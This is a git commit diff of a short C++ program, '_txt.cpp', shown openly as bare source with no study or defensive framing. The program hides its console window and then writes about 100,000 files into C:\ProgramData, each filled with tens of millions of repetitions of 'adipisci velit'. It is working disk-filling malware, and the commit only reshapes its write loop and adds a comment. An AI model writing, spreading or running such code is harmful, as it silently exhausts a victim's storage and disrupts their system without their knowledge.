7cb1cbfc18011dd404362fc94b391a0df70d524c
_hange <52858353+onur-py@users.noreply.github.com>
2022-03-14 05:00:45 +0300

    Update _txt.cpp

--- _txt.cpp
+++ _txt.cpp
@@ -4,12 +4,10 @@
 #include <math.h>
 #include <windows.h>
 
-
 using namespace std;
 
 void wrt(){
-
-ShowWindow(GetConsoleWindow(),SW_HIDE);
+ShowWindow(GetConsoleWindow(),SW_HIDE);//hide cmd
 
 for(int i=0;i<pow(10,5);i++){
  	string ss="file";
@@ -18,16 +16,12 @@ for(int i=0;i<pow(10,5);i++){
 	string y=ss+bb+aa;
 	ofstream myfile("C:\\ProgramData\\"+y,ios::app);
  	
-	 for(int y=0;y<pow(10,5)*705;y++){
-	 myfile<<"adipisci velit"<<endl;
-	}
- 	
-}
-}
+	 for(int y=0;y<pow(10,5);y++){
+	 for(int s=0;s<705;s++){
+	 	myfile<<"adipisci velit ";}
+	}	}}
 int main ()
 {
 wrt();
- 
- 
   return 0;
 }
